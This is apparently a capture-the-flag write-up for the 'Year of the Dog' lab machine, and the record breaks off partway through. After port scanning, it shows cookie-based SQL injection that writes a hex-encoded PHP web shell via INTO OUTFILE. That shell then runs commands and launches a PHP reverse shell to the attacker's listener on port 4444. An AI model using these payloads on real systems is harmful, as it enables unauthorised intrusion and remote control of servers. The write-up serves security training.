# Year of the Dog — Writeup

## Overview
### Year of the Dog — Writeup
### Year of the Dog — Writeup
----
Always so polite...
----
![](https://i.imgur.com/riFhcXC.png)
Start Machine
Who knew? The dog has some bite!
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.8.29 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.8.29:22
Open 10.10.8.29:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.8.29 [2 ports]
Discovered open port 80/tcp on 10.10.8.29
Discovered open port 22/tcp on 10.10.8.29
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.8.29
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.8.29.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.8.29
Host is up, received user-set (0.32s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4c9dd9bdb959efd19a9a60d4c439ffa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDrxDlZxvJUZk2qXaeBdjHxfM3MSGpZ8H6zPqgarnP3K806zE1Y/CryyT4wgIZYomtV8wUWHlFkuqbWjcKcM1MWcPjzGWfPZ2wHTNgUkHvBWZ+fxoX8vJoC6wfpifa7bSMaOItFWSLnMGOXigHbF6dPNyP+/kXAJE+tg9TurrTKaPiL6u+02ITeVUuLWsjwlLDJAnu1zDhPONR2b7WTcU/zQxHUYZiHpHn5eBtXpCZPZyfOZ+828ibobM/CAHIBZqJsYksAe5RbtDw7Vdw/8OtYuo4Koz8C2kBoWCHvsmyDfwZ57E2Ycss4JG5j7fMt7sI+lh/NHE+/7zrXdH/4njCD
|   256 c3fc10d878477efb89cf818b6ef10afd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMlni4gM6dVkvfGeMy6eg/18HsCYvvFhbpycXiGYM3fitNhTXW4WpMpr8W/0y2FszEB6TGD93ib/lCTsBOQG5Uw=
|   256 2768ffefc068e249755934f2bdf0c920 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICQIHukp5WpajvhF4juRWmL2+YtbN9HbhgLScgqYNien
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Canis Queue
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.34 seconds

cookie

be3d07e81db8665cb40f322eb0c7e55c'

Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''be3d07e81db8665cb40f322eb0c7e55c''' at line 1

be3d07e81db8665cb40f322eb0c7e55c' union select 1, @@version-- -

You are number 5.7.34-0ubuntu0.18.04.1 in the queue

be3d07e81db8665cb40f322eb0c7e55c' union select 1, table_name FROM information_schema.tables-- -

You are number queue in the queue

be3d07e81db8665cb40f322eb0c7e55c' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -

You are number Error in the queue

<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";?>

http://10.10.8.29/shell.php?cmd=whoami

www-data

http://10.10.8.29/shell.php?cmd=php%20-r%20%27$sock=fsockopen(%2210.8.19.103%22,4444);$proc=proc_open(%22/bin/bash%22,%20array(0=%3E$sock,%201=%3E$sock,%202=%3E$sock),$pipes);%27

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444                                     
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.8.29] 49582
which python
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@year-of-the-dog:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@year-of-the-dog:/var/www/html$ ifconfig
ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:c9ff:feba:acb  prefixlen 64  scopeid 0x20<link>
        ether 02:42:c9:ba:0a:cb  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 446 (446.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.8.29  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::4e:10ff:fe9a:c053  prefixlen 64  scopeid 0x20<link>
        ether 02:4e:10:9a:c0:53  txqueuelen 1000  (Ethernet)
        RX packets 54787  bytes 3305754 (3.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 54829  bytes 3171323 (3.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 124  bytes 10610 (10.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 124  bytes 10610 (10.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth9e12dc0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::6c37:e3ff:fe79:450e  prefixlen 64  scopeid 0x20<link>
        ether 6e:37:e3:79:45:0e  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19  bytes 1522 (1.5 KB)
